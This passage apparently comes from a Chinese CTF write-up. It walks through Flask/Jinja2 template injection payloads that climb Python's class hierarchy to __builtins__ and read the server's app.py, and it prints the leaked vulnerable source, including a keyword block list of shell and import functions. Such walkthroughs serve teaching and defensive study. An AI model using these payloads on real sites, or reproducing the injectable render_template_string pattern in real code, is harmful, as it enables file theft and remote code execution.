<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>]&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[<span class="string">&quot; &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;\n&quot;</span>]</span><br><span class="line"></span><br><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[<span class="string">&#x27; &lt;function _ModuleLock.__init__ at 0x7ff9d73d9290&gt;\n&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>调用全局进行访问函数所在的全局命名空间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[<span class="string">&#x27; &#123;\&#x27;__name__\&#x27;: \&#x27;importlib._bootstrap\&#x27;, \&#x27;__doc__\&#x27;: \&#x27;Core implementation of import.\\n\\nThis module is NOT meant to be directly imported! It has been designed such\\nthat it can be bootstrapped into Python as the implementation of import. As\\nsuch it requires the injection of specific modules and attributes in order to\\nwork. One should use importlib as the public-facing version of this module.\\n\\n\&#x27;, \&#x27;__package__\&#x27;: \&#x27;importlib\&#x27;, \&#x27;__loader__\&#x27;: &lt;class \&#x27;_frozen_importlib.FrozenImporter\&#x27;&gt;, \&#x27;__spec__\&#x27;: ModuleSpec(name=\&#x27;_frozen_importlib\&#x27;, loader=&lt;class \&#x27;_frozen_importlib.FrozenImporter\&#x27;&gt;), \&#x27;__builtins__\&#x27;: &#123;\&#x27;__name__\&#x27;: \&#x27;builtins\&#x27;, \&#x27;__doc__\&#x27;: &quot;Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil\&#x27; object; Ellipsis represents `...\&#x27; in slices.&quot;, \&#x27;__package__\&#x27;: \&#x27;\&#x27;, \&#x27;__loader__\&#x27;: &lt;class \&#x27;_frozen_importlib.BuiltinImporter\&#x27;&gt;, \&#x27;__spec__\&#x27;: ModuleSpec(name=\&#x27;builtins\&#x27;, loader=&lt;class \&#x27;_frozen_importlib.BuiltinImporter\&#x27;&gt;), \&#x27;__build_class__\&#x27;: &lt;built-in function __build_class__&gt;, \&#x27;__import__\&#x27;: &lt;built-in function __import__&gt;, \&#x27;abs\&#x27;: &lt;built-in function abs&gt;, \&#x27;all\&#x27;: &lt;built-in function all&gt;, \&#x27;any\&#x27;: &lt;built-in function any&gt;, \&#x27;ascii\&#x27;: &lt;built-in function ascii&gt;, \&#x27;bin\&#x27;: &lt;built-in function bin&gt;, \&#x27;breakpoint\&#x27;: &lt;built-in function breakpoint&gt;, \&#x27;callable\&#x27;: &lt;built-in function callable&gt;, \&#x27;chr\&#x27;: &lt;built-in function chr&gt;, \&#x27;compile\&#x27;: &lt;built-in function compile&gt;, \&#x27;delattr\&#x27;: &lt;built-in function delattr&gt;, \&#x27;dir\&#x27;: &lt;built-in function dir&gt;, \&#x27;divmod\&#x27;: &lt;built-in function divmod&gt;, \&#x27;eval\&#x27;: &lt;built-in function eval&gt;, \&#x27;exec\&#x27;: &lt;built-in function exec&gt;, \&#x27;format\&#x27;: &lt;built-in function format&gt;, \&#x27;getattr\&#x27;: &lt;built-in function getattr&gt;, \&#x27;globals\&#x27;: &lt;built-in function globals&gt;, \&#x27;hasattr\&#x27;: &lt;built-in function hasattr&gt;, \&#x27;hash\&#x27;: &lt;built-in function hash&gt;, \&#x27;hex\&#x27;: &lt;built-in function hex&gt;, \&#x27;id\&#x27;: &lt;built-in function id&gt;, \&#x27;input\&#x27;: &lt;built-in function input&gt;, \&#x27;isinstance\&#x27;: &lt;built-in function isinstance&gt;, \&#x27;issubclass\&#x27;: &lt;built-in function issubclass&gt;, \&#x27;iter\&#x27;: &lt;built-in function iter&gt;, \&#x27;len\&#x27;: &lt;built-in function len&gt;, \&#x27;locals\&#x27;: &lt;built-in function locals&gt;, \&#x27;max\&#x27;: &lt;built-in function max&gt;, \&#x27;min\&#x27;: &lt;built-in function min&gt;, \&#x27;next\&#x27;: &lt;built-in function next&gt;, \&#x27;oct\&#x27;: &lt;built-in function oct&gt;, \&#x27;ord\&#x27;: &lt;built-in function ord&gt;, \&#x27;pow\&#x27;: &lt;built-in function pow&gt;, \&#x27;print\&#x27;: &lt;built-in function print&gt;, \&#x27;repr\&#x27;: &lt;built-in function repr&gt;, \&#x27;round\&#x27;: &lt;built-in function round&gt;, \&#x27;setattr\&#x27;: &lt;built-in function setattr&gt;, \&#x27;sorted\&#x27;: &lt;built-in function sorted&gt;, \&#x27;sum\&#x27;: &lt;built-in function sum&gt;, \&#x27;vars\&#x27;: &lt;built-in function vars&gt;, \&#x27;None\&#x27;: None, \&#x27;Ellipsis\&#x27;: Ellipsis, \&#x27;NotImplemented\&#x27;: NotImplemented, \&#x27;False\&#x27;: False, \&#x27;True\&#x27;: True, \&#x27;bool\&#x27;: &lt;class \&#x27;bool\&#x27;&gt;, \&#x27;memoryview\&#x27;: &lt;class \&#x27;memoryview\&#x27;&gt;, \&#x27;bytearray\&#x27;: &lt;class \&#x27;bytearray\&#x27;&gt;, \&#x27;bytes\&#x27;: &lt;class \&#x27;bytes\&#x27;&gt;, \&#x27;classmethod\&#x27;: &lt;class \&#x27;classmethod\&#x27;&gt;, \&#x27;complex\&#x27;: &lt;class \&#x27;complex\&#x27;&gt;, \&#x27;dict\&#x27;: &lt;class \&#x27;dict\&#x27;&gt;, \&#x27;enumerate\&#x27;: &lt;class \&#x27;enumerate\&#x27;&gt;, \&#x27;filter\&#x27;: &lt;class \&#x27;filter\&#x27;&gt;, \&#x27;float\&#x27;: &lt;class \&#x27;float\&#x27;&gt;, \&#x27;frozenset\&#x27;: &lt;class \&#x27;frozenset\&#x27;&gt;, \&#x27;property\&#x27;: &lt;class \&#x27;property\&#x27;&gt;, \&#x27;int\&#x27;: &lt;class \&#x27;int\&#x27;&gt;, \&#x27;list\&#x27;: &lt;class \&#x27;list\&#x27;&gt;, \&#x27;map\&#x27;: &lt;class \&#x27;map\&#x27;&gt;, \&#x27;object\&#x27;: &lt;class \&#x27;object\&#x27;&gt;, \&#x27;range\&#x27;: &lt;class \&#x27;range\&#x27;&gt;, \&#x27;reversed\&#x27;: &lt;class \&#x27;reversed\&#x27;&gt;, \&#x27;set\&#x27;: &lt;class \&#x27;set\&#x27;&gt;, \&#x27;slice\&#x27;: &lt;class \&#x27;slice\&#x27;&gt;, \&#x27;staticmethod\&#x27;: &lt;class \&#x27;staticmethod\&#x27;&gt;, \&#x27;str\&#x27;: &lt;class \&#x27;str\&#x27;&gt;, \&#x27;super\&#x27;: &lt;class \&#x27;super\&#x27;&gt;, \&#x27;tuple\&#x27;: &lt;class \&#x27;tuple\&#x27;&gt;, \&#x27;type\&#x27;: &lt;class \&#x27;type\&#x27;&gt;, \&#x27;zip\&#x27;: &lt;class \&#x27;zip\&#x27;&gt;, \&#x27;__debug__\&#x27;: True, \&#x27;BaseException\&#x27;: &lt;class \&#x27;BaseException\&#x27;&gt;, \&#x27;Exception\&#x27;: &lt;class \&#x27;Exception\&#x27;&gt;, \&#x27;TypeError\&#x27;: &lt;class \&#x27;TypeError\&#x27;&gt;, \&#x27;StopAsyncIteration\&#x27;: &lt;class \&#x27;StopAsyncIteration\&#x27;&gt;, \&#x27;StopIteration\&#x27;: &lt;class \&#x27;StopIteration\&#x27;&gt;, \&#x27;GeneratorExit\&#x27;: &lt;class \&#x27;GeneratorExit\&#x27;&gt;, \&#x27;SystemExit\&#x27;: &lt;class \&#x27;SystemExit\&#x27;&gt;, \&#x27;KeyboardInterrupt\&#x27;: &lt;class \&#x27;KeyboardInterrupt\&#x27;&gt;, \&#x27;ImportError\&#x27;: &lt;class \&#x27;ImportError\&#x27;&gt;, \&#x27;ModuleNotFoundError\&#x27;: &lt;class \&#x27;ModuleNotFoundError\&#x27;&gt;, \&#x27;OSError\&#x27;: &lt;class \&#x27;OSError\&#x27;&gt;, \&#x27;EnvironmentError\&#x27;: &lt;class \&#x27;OSError\&#x27;&gt;, \&#x27;IOError\&#x27;: &lt;class \&#x27;OSError\&#x27;&gt;, \&#x27;EOFError\&#x27;: &lt;class \&#x27;EOFError\&#x27;&gt;, \&#x27;RuntimeError\&#x27;: &lt;class \&#x27;RuntimeError\&#x27;&gt;, \&#x27;RecursionError\&#x27;: &lt;class \&#x27;RecursionError\&#x27;&gt;, \&#x27;NotImplementedError\&#x27;: &lt;class \&#x27;NotImplementedError\&#x27;&gt;, \&#x27;NameError\&#x27;: &lt;class \&#x27;NameError\&#x27;&gt;, \&#x27;UnboundLocalError\&#x27;: &lt;class \&#x27;UnboundLocalError\&#x27;&gt;, \&#x27;AttributeError\&#x27;: &lt;class \&#x27;AttributeError\&#x27;&gt;, \&#x27;SyntaxError\&#x27;: &lt;class \&#x27;SyntaxError\&#x27;&gt;, \&#x27;IndentationError\&#x27;: &lt;class \&#x27;IndentationError\&#x27;&gt;, \&#x27;TabError\&#x27;: &lt;class \&#x27;TabError\&#x27;&gt;, \&#x27;LookupError\&#x27;: &lt;class \&#x27;LookupError\&#x27;&gt;, \&#x27;IndexError\&#x27;: &lt;class \&#x27;IndexError\&#x27;&gt;, \&#x27;KeyError\&#x27;: &lt;class \&#x27;KeyError\&#x27;&gt;, \&#x27;ValueError\&#x27;: &lt;class \&#x27;ValueError\&#x27;&gt;, \&#x27;UnicodeError\&#x27;: &lt;class \&#x27;UnicodeError\&#x27;&gt;, \&#x27;UnicodeEncodeError\&#x27;: &lt;class \&#x27;UnicodeEncodeError\&#x27;&gt;, \&#x27;UnicodeDecodeError\&#x27;: &lt;class \&#x27;UnicodeDecodeError\&#x27;&gt;, \&#x27;UnicodeTranslateError\&#x27;: &lt;class \&#x27;UnicodeTranslateError\&#x27;&gt;, \&#x27;AssertionError\&#x27;: &lt;class \&#x27;AssertionError\&#x27;&gt;, \&#x27;ArithmeticError\&#x27;: &lt;class \&#x27;ArithmeticError\&#x27;&gt;, \&#x27;FloatingPointError\&#x27;: &lt;class \&#x27;FloatingPointError\&#x27;&gt;, \&#x27;OverflowError\&#x27;: &lt;class \&#x27;OverflowError\&#x27;&gt;, \&#x27;ZeroDivisionError\&#x27;: &lt;class \&#x27;ZeroDivisionError\&#x27;&gt;, \&#x27;SystemError\&#x27;: &lt;class \&#x27;SystemError\&#x27;&gt;, \&#x27;ReferenceError\&#x27;: &lt;class \&#x27;ReferenceError\&#x27;&gt;, \&#x27;MemoryError\&#x27;: &lt;class \&#x27;MemoryError\&#x27;&gt;, \&#x27;BufferError\&#x27;: &lt;class \&#x27;BufferError\&#x27;&gt;, \&#x27;Warning\&#x27;: &lt;class \&#x27;Warning\&#x27;&gt;, \&#x27;UserWarning\&#x27;: &lt;class \&#x27;UserWarning\&#x27;&gt;, \&#x27;DeprecationWarning\&#x27;: &lt;class \&#x27;DeprecationWarning\&#x27;&gt;, \&#x27;PendingDeprecationWarning\&#x27;: &lt;class \&#x27;PendingDeprecationWarning\&#x27;&gt;, \&#x27;SyntaxWarning\&#x27;: &lt;class \&#x27;SyntaxWarning\&#x27;&gt;, \&#x27;RuntimeWarning\&#x27;: &lt;class \&#x27;RuntimeWarning\&#x27;&gt;, \&#x27;FutureWarning\&#x27;: &lt;class \&#x27;FutureWarning\&#x27;&gt;, \&#x27;ImportWarning\&#x27;: &lt;class \&#x27;ImportWarning\&#x27;&gt;, \&#x27;UnicodeWarning\&#x27;: &lt;class \&#x27;UnicodeWarning\&#x27;&gt;, \&#x27;BytesWarning\&#x27;: &lt;class \&#x27;BytesWarning\&#x27;&gt;, \&#x27;ResourceWarning\&#x27;: &lt;class \&#x27;ResourceWarning\&#x27;&gt;, \&#x27;ConnectionError\&#x27;: &lt;class \&#x27;ConnectionError\&#x27;&gt;, \&#x27;BlockingIOError\&#x27;: &lt;class \&#x27;BlockingIOError\&#x27;&gt;, \&#x27;BrokenPipeError\&#x27;: &lt;class \&#x27;BrokenPipeError\&#x27;&gt;, \&#x27;ChildProcessError\&#x27;: &lt;class \&#x27;ChildProcessError\&#x27;&gt;, \&#x27;ConnectionAbortedError\&#x27;: &lt;class \&#x27;ConnectionAbortedError\&#x27;&gt;, \&#x27;ConnectionRefusedError\&#x27;: &lt;class \&#x27;ConnectionRefusedError\&#x27;&gt;, \&#x27;ConnectionResetError\&#x27;: &lt;class \&#x27;ConnectionResetError\&#x27;&gt;, \&#x27;FileExistsError\&#x27;: &lt;class \&#x27;FileExistsError\&#x27;&gt;, \&#x27;FileNotFoundError\&#x27;: &lt;class \&#x27;FileNotFoundError\&#x27;&gt;, \&#x27;IsADirectoryError\&#x27;: &lt;class \&#x27;IsADirectoryError\&#x27;&gt;, \&#x27;NotADirectoryError\&#x27;: &lt;class \&#x27;NotADirectoryError\&#x27;&gt;, \&#x27;InterruptedError\&#x27;: &lt;class \&#x27;InterruptedError\&#x27;&gt;, \&#x27;PermissionError\&#x27;: &lt;class \&#x27;PermissionError\&#x27;&gt;, \&#x27;ProcessLookupError\&#x27;: &lt;class \&#x27;ProcessLookupError\&#x27;&gt;, \&#x27;TimeoutError\&#x27;: &lt;class \&#x27;TimeoutError\&#x27;&gt;, \&#x27;open\&#x27;: &lt;built-in function open&gt;, \&#x27;quit\&#x27;: Use quit() or Ctrl-D (i.e. EOF) to exit, \&#x27;exit\&#x27;: Use exit() or Ctrl-D (i.e. EOF) to exit, \&#x27;copyright\&#x27;: Copyright (c) 2001-2019 Python Software Foundation.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;All Rights Reserved.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;Copyright (c) 2000 BeOpen.com.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;All Rights Reserved.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;Copyright (c) 1995-2001 Corporation for National Research Initiatives.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;All Rights Reserved.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;All Rights Reserved., &#x27;credits&#x27;:     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands\n&quot;</span>]</span><br><span class="line">[<span class="string">&quot;    for supporting Python development.  See www.python.org for more information., &#x27;license&#x27;: Type license() to see the full license text, &#x27;help&#x27;: Type help() for interactive help, or help(object) for help about object.&#125;, &#x27;_bootstrap_external&#x27;: &lt;module &#x27;importlib._bootstrap_external&#x27; (frozen)&gt;, &#x27;_wrap&#x27;: &lt;function _wrap at 0x7ff9d73d90e0&gt;, &#x27;_new_module&#x27;: &lt;function _new_module at 0x7ff9d73d9170&gt;, &#x27;_module_locks&#x27;: &#123;&#125;, &#x27;_blocking_on&#x27;: &#123;&#125;, &#x27;_DeadlockError&#x27;: &lt;class &#x27;_frozen_importlib._DeadlockError&#x27;&gt;, &#x27;_ModuleLock&#x27;: &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &#x27;_DummyModuleLock&#x27;: &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &#x27;_ModuleLockManager&#x27;: &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &#x27;_get_module_lock&#x27;: &lt;function _get_module_lock at 0x7ff9d73d9200&gt;, &#x27;_lock_unlock_module&#x27;: &lt;function _lock_unlock_module at 0x7ff9d73d9950&gt;, &#x27;_call_with_frames_removed&#x27;: &lt;function _call_with_frames_removed at 0x7ff9d73d99e0&gt;, &#x27;_verbose_message&#x27;: &lt;function _verbose_message at 0x7ff9d73d9a70&gt;, &#x27;_requires_builtin&#x27;: &lt;function _requires_builtin at 0x7ff9d73d9b00&gt;, &#x27;_requires_frozen&#x27;: &lt;function _requires_frozen at 0x7ff9d73d9b90&gt;, &#x27;_load_module_shim&#x27;: &lt;function _load_module_shim at 0x7ff9d73d9c20&gt;, &#x27;_module_repr&#x27;: &lt;function _module_repr at 0x7ff9d73d9cb0&gt;, &#x27;_installed_safely&#x27;: &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt;, &#x27;ModuleSpec&#x27;: &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &#x27;spec_from_loader&#x27;: &lt;function spec_from_loader at 0x7ff9d73d9d40&gt;, &#x27;_spec_from_module&#x27;: &lt;function _spec_from_module at 0x7ff9d73dc440&gt;, &#x27;_init_module_attrs&#x27;: &lt;function _init_module_attrs at 0x7ff9d73dc4d0&gt;, &#x27;module_from_spec&#x27;: &lt;function module_from_spec at 0x7ff9d73dc560&gt;, &#x27;_module_repr_from_spec&#x27;: &lt;function _module_repr_from_spec at 0x7ff9d73dc5f0&gt;, &#x27;_exec&#x27;: &lt;function _exec at 0x7ff9d73dc680&gt;, &#x27;_load_backward_compatible&#x27;: &lt;function _load_backward_compatible at 0x7ff9d73dc710&gt;, &#x27;_load_unlocked&#x27;: &lt;function _load_unlocked at 0x7ff9d73dc7a0&gt;, &#x27;_load&#x27;: &lt;function _load at 0x7ff9d73dc830&gt;, &#x27;BuiltinImporter&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;FrozenImporter&#x27;: &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &#x27;_ImportLockContext&#x27;: &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &#x27;_resolve_name&#x27;: &lt;function _resolve_name at 0x7ff9d73dc8c0&gt;, &#x27;_find_spec_legacy&#x27;: &lt;function _find_spec_legacy at 0x7ff9d73df830&gt;, &#x27;_find_spec&#x27;: &lt;function _find_spec at 0x7ff9d73df8c0&gt;, &#x27;_sanity_check&#x27;: &lt;function _sanity_check at 0x7ff9d73df950&gt;, &#x27;_ERR_MSG_PREFIX&#x27;: &#x27;No module named &#x27;, &#x27;_ERR_MSG&#x27;: &#x27;No module named &#123;!r&#125;&#x27;, &#x27;_find_and_load_unlocked&#x27;: &lt;function _find_and_load_unlocked at 0x7ff9d73df9e0&gt;, &#x27;_NEEDS_LOADING&#x27;: &lt;object object at 0x7ff9d73c7060&gt;, &#x27;_find_and_load&#x27;: &lt;function _find_and_load at 0x7ff9d73dfa70&gt;, &#x27;_gcd_import&#x27;: &lt;function _gcd_import at 0x7ff9d73dfb00&gt;, &#x27;_handle_fromlist&#x27;: &lt;function _handle_fromlist at 0x7ff9d73dfb90&gt;, &#x27;_calc___package__&#x27;: &lt;function _calc___package__ at 0x7ff9d73dfc20&gt;, &#x27;__import__&#x27;: &lt;function __import__ at 0x7ff9d73dfcb0&gt;, &#x27;_builtin_from_name&#x27;: &lt;function _builtin_from_name at 0x7ff9d73dfd40&gt;, &#x27;_setup&#x27;: &lt;function _setup at 0x7ff9d73dfdd0&gt;, &#x27;_install&#x27;: &lt;function _install at 0x7ff9d73dfe60&gt;, &#x27;_install_external_importers&#x27;: &lt;function _install_external_importers at 0x7ff9d73dfef0&gt;, &#x27;_imp&#x27;: &lt;module &#x27;_imp&#x27; (built-in)&gt;, &#x27;sys&#x27;: &lt;module &#x27;sys&#x27; (built-in)&gt;, &#x27;_thread&#x27;: &lt;module &#x27;_thread&#x27; (built-in)&gt;, &#x27;_warnings&#x27;: &lt;module &#x27;_warnings&#x27; (built-in)&gt;, &#x27;_weakref&#x27;: &lt;module &#x27;_weakref&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;/usr/local/lib/python3.7/importlib/_bootstrap.py&#x27;&#125;\n&quot;</span>]</span><br></pre></td></tr></table></figure>

<p><code>__builtins__</code> 是 Python 中内置命名空间的一个引用，它是一个字典，包含了 Python 解释器启动时默认加载的一些内置函数、类型和模块。调用这个模块进行函数执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请输入注入语句：&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;app.py&#x27;</span>).read()&#125;&#125;</span><br><span class="line">返回的结果为：</span><br><span class="line">[<span class="string">&#x27; from flask import Flask,render_template_string\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;from flask import render_template,request,flash,redirect,url_for\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;from flask_wtf import FlaskForm\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;from wtforms import StringField, SubmitField\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;from wtforms.validators import DataRequired\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;from flask_bootstrap import Bootstrap\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;import base64\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;app = Flask(__name__)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;app.config[&#x27;SECRET_KEY&#x27;] = &#x27;s_e_c_r_e_t_k_e_y&#x27;\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;bootstrap = Bootstrap(app)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;class NameForm(FlaskForm):\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;    text = StringField(&#x27;BASE64加密&#x27;,validators= [DataRequired()])\n&quot;</span>]</span><br><span class="line">[<span class="string">&quot;    submit = SubmitField(&#x27;提交&#x27;)\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;class NameForm1(FlaskForm):\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;    text = StringField(&#x27;BASE64解密&#x27;,validators= [DataRequired()])\n&quot;</span>]</span><br><span class="line">[<span class="string">&quot;    submit = SubmitField(&#x27;提交&#x27;)\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;def waf(str):\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;                  &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    for x in black_list :\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        if x in str.lower() :\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;            return 1\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;@app.route(&#x27;/hint&#x27;,methods=[&#x27;GET&#x27;])\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;def hint():\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    txt = &quot;失败乃成功之母！！&quot;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    return render_template(&quot;hint.html&quot;,txt = txt)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;def encode():\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;    if request.values.get(&#x27;text&#x27;) :\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;        text = request.values.get(&quot;text&quot;)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        text_decode = base64.b64encode(text.encode())\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        tmp = &quot;结果  :&#123;0&#125;&quot;.format(str(text_decode.decode()))\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        res =  render_template_string(tmp)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        flash(tmp)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;        return redirect(url_for(&#x27;encode&#x27;))\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    else :\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        text = &quot;&quot;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        form = NameForm(text)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;def decode():\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;    if request.values.get(&#x27;text&#x27;) :\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;        text = request.values.get(&quot;text&quot;)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        text_decode = base64.b64decode(text.encode())\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        if waf(tmp) :\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;            flash(&quot;no no no !!&quot;)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;            return redirect(url_for(&#x27;decode&#x27;))\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;        res =  render_template_string(tmp)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        flash( res )\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;        return redirect(url_for(&#x27;decode&#x27;))\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    else :\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        text = &quot;&quot;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        form = NameForm1(text)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;        return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;@app.route(&#x27;/&lt;name&gt;&#x27;,methods=[&#x27;GET&#x27;])\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;def not_found(name):\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;    return render_template(&quot;404.html&quot;,name = name)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">[<span class="string">&quot;if __name__ == &#x27;__main__&#x27;:\n&quot;</span>]</span><br><span class="line">[<span class="string">&#x27;    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)\n&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;\n&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>当前页面的文件可以使用报错进行查看。报错的方法：在解密base64页面进行随意的输入并且解密即可获得部分泄露的调试信息（debug）。</p>
<p>下面是获取的完整源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span 